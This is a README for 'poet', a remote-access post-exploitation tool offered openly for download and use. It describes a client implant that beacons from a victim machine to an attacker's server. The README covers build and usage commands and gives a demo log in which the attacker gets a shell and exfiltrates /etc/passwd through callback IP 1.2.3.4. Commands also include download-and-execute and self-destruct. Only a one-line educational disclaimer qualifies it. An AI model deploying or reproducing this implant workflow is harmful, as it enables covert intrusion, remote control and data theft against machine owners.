# poet

A simple POst-Exploitation Tool.

## overview

The client program runs on the target machine and is configured with an IP
address (the server) to connect to and a frequency to connect at. If the server
isn't running when the client tries to connect, the client quietly sleeps and
tries again at the next interval. If the server is running however, the
attacker gets a control shell to control the client and perform various actions
on the target including:

- reconnaissance
- remote shell
- file exfiltration
- download and execute
- self destruct

## getting started

Go to the [releases](http://github.com/mossberg/poet/releases) page and
download the latest `poet-client` and `poet-server` files available.

Then skip to the Usage section below.

Alternatively, you can build Poet yourself (it's pretty easy). Make sure you
have the `python2.7` and `zip` executables available.

```
$ git clone https://github.com/mossberg/poet
$ cd poet
$ make
```

This will create a `bin/` directory which contains `poet-client`
and `poet-server`.

## usage

Poet is super easy to use, and requires nothing more than the Python (2.7)
standard library. To easily try it out, a typical invocation would look like:

Terminal 1:

```
$ ./poet-client -v 127.0.0.1 1
```

Terminal 2:

```
$ sudo ./poet-server
```

Note: By default, the server needs to be run as root (using `sudo`) because
the default port it binds to is 443. If that makes you uncomfortable, simply
omit `sudo` and use the `-p <PORT>` flag on both the client and server. Pick a
nice, high number for your port (> 1024).

Of course, using the `-h` flag gives you the full usage.

```
$ ./poet-client -h
usage: poet-client [-h] [-p PORT] [-v] [-d] IP [INTERVAL]

positional arguments:
  IP                    server
  INTERVAL              (s)

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT
  -v, --verbose
  -d, --delete          delete client upon execution

$ ./poet-server -h
usage: poet-server [-h] [-p PORT]

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT
```

## demo

This is just a small sample of what poet can do.

The scenario is, an attacker has gotten access to the victim's machine and
downloaded and executed the client (in verbose mode ;).  He/she does not have
the server running at this point, but it's ok, the client waits patiently.
Eventually the attacker is ready and starts the server, first starting a shell
and executing `uname -a`, then exfiltrating `/etc/passwd`. Then he/she exits
and detaches from the client, which continues running on the target waiting for
the next opportunity to connect to the server.

Victim's Machine (5.4.3.2):

```
$ ./poet-client -v 1.2.3.4 10
[+] Poet started with interval of 10 seconds to port 443. Ctrl-c to exit.
[!] (2015-03-27 03:40:12.259676) Server is inactive
[!] (2015-03-27 03:40:22.263161) Server is inactive
[!] (2015-03-27 03:40:32.267308) Server is inactive
[+] (2015-03-27 03:40:42.273376) Server is active
[!] (2015-03-27 03:41:07.145979) Server is inactive
[!] (2015-03-27 03:41:17.150634) Server is inactive
[!] (2015-03-27 03:41:27.155614) Server is inactive
[!] (2015-03-27 03:41:37.160440) Server is inactive
```

Attacker's Machine (1.2.3.4):

```
# ./poet-server
                          _
        ____  ____  ___  / /_
       / __ \/ __ \/ _ \/ __/
      / /_/ / /_/ /  __/ /
     / .___/\____/\___/\__/     v0.4
    /_/

[+] Poet server started on 443.
[+] (2015-03-27 03:40:42.272601) Connected By: ('5.4.3.2', 59309) -> VALID
[+] (2015-03-27 03:40:42.273087) Entering control shell
Welcome to psh, the Poet shell!
Running `help' will give you a list of supported commands.
psh > shell
psh > user@server $ uname -a
Linux lolServer 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed May 07 16:19:23 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
psh > user@server $ ^D
psh > exfil /etc/passwd
psh : exfil written to archive/20150327/exfil/passwd-201503274054.txt
psh > help
Commands:
  chint
  dlexec
  exec
  exfil
  exit
  help
  recon
  selfdestruct
  shell
psh > exit
[+] (2015-03-27 03:40:57.144083) Exiting control shell.
[-] (2015-03-27 03:40:57.144149) Poet server terminated.
```

## disclaimer

I am building Poet purely for my own education and learning experience.
The code is freely available because I think it might be useful to others
interested in learning about this sort of thing. Use it responsibly.
